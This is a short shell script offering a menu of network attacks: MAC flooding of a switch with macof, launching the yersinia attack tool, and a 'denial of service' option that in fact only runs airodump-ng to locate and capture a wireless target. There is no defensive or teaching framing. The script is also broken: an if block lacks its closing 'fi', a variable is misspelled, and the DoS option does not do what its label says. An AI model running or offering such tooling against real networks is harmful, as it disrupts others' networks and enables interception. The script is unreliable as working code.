#!/bin/sh
macflood(){
    echo "Enter device name"
    read n
    echo "Enter attacking ip for mac flood"
    read s
    macof -i $n -s $s
}
discoveryflood(){
        yersinia -G 
}
denialofservice(){
    echo "Enter device name"
    read de
    echo "Do you have bssid and chnnel no"
    echo "1.For finding traget bssid and channel no."
    echo "2.For attacking the traget"
    read choice
    if [ $choice -eq 1 ];
    then
        airodump-ng $de
    elif [ $choie -eq 2 ];
    then
        echo " Enter bssid of Target "
        read bs
        echo  " Enter channel number "
        read ch
        echo  " Enter file name you want "
        read wr
        airodump-ng $de --bssid $bs --channel $ch --write $wr
}
echo "Select an attack"
echo "1. Mac Flooding"
echo  "2. Discovery Flooding"
echo  "3. Denial of service attack "
read f
if [ $f -eq 1 ];
then
    macflood
elif [ $f -eq 2 ];
then
    discoveryflood
elif [ $f -eq 3 ];
then
    denialofservice
fi 